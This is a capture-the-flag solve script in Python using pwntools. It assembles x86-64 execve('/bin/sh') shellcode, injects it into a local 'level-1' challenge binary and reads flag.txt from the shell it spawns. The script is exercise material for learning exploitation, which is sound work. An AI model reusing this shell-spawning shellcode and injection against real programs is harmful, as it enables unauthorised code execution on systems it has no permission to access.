#!/usr/bin/env python3

'''
WhatTheFuzz's submission for level-1, a random pwnable passed down from
@huckfinn.

This script can be used in the following manner:
python3 ./solve.py

Returns:
    The flag to solve the challenge.
'''

import time
from pwn import *

exe = ELF('./level-1')

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

def conn():
    '''Establish the connection to the process.
    '''

    io = process([exe.path])
    return io

def gen_shellcode():
    '''Create the shellcode we need to spawn a shell.
    Return the assembly as a byte string.
    '''

    # Create the shellcode.
    # https://systemoverlord.com/2016/04/27/even-shorter-shellcode.ht
    shellcode = """
    /* push argument into rsi (second argument to execve) */
    xor esi, esi                /* zero out register */
    push rsi                    /* push to top of stack */

    /* set up first argument */
    mov r11, 0x68732f2f6e69622f /* move /bin/sh into r11 */
    push r11                    /* /bin/sh top of stack */
    push rsp                    /* memory location of /bin/sh top of stack */
    pop rdi                     /* edi contains the address of /bin/sh */

    /* set up third argument */
    mov eax, 0x0                /* mov 0 into rax */
    mov al, 0x3b                /* move execve sys call into rax */

    /* call our execve */
    syscall
    """

    # Return the assembly.
    return asm(shellcode)


def main():
    '''Return the flag.
    '''

    with conn() as io:

        # Create the shellcode.
        shellcode = gen_shellcode()
        io.sendline(shellcode)

        # Get the flag.
        io.sendline('cat flag.txt')
        flag = io.recv()
        log.success(f'Flag: {flag}')

        return flag

def time_func(func):
    '''Time the main function.
    '''

    start = time.time()
    func()
    end = time.time()

    log.success(f'Time: {end - start}')

if __name__ == '__main__':
    time_func(main)
